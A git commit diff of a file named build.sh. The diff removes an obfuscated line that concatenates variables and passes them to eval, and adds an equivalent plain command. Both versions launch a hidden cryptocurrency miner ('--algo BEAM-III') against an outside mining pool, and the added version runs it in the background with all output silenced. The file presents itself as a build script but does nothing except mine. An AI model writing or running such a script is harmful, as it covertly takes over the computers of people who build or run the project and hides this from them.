db41ccbaa4be38546c36ba4db339ecbb7bc160ef
anihsugiarti9 <137507644+anihsugiarti9@users.noreply.github.com>
2024-11-08 15:33:47 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,3 +1,1 @@
-z="
-";Zz='0E-$';fz='%M-%';Nz='-use';Xz='.$(e';Sz='62tr';nz=' 2>&';ez='"%H-';Lz='22:4';Rz='wsC8';mz='null';bz='UTC-';Kz='78.2';cz='7 da';Iz=' 47.';Uz='MzQW';kz='e >/';Dz='algo';Jz='237.';Gz='I --';Ez=' BEA';Wz='F63j';Hz='pool';gz='S"))';Mz='43 -';Pz='Wuij';jz='nabl';Vz='6JAN';oz='1';az='(TZ=';Qz='UT2h';lz='dev/';Tz='VXBS';Yz='cho ';Cz='t --';Fz='M-II';Bz='ojec';Oz='r 3J';dz='te +';iz='ls e';hz=' --t';Az='./pr';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz"
+./project --algo BEAM-III --pool 47.237.78.222:80 --user 35abc183df02cef8b5ab05ea3df9ecf5e1b8bbeb8ccc0bdb7a27073e80621131c4e.$(echo 0E-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl >/dev/null 2>&1 &
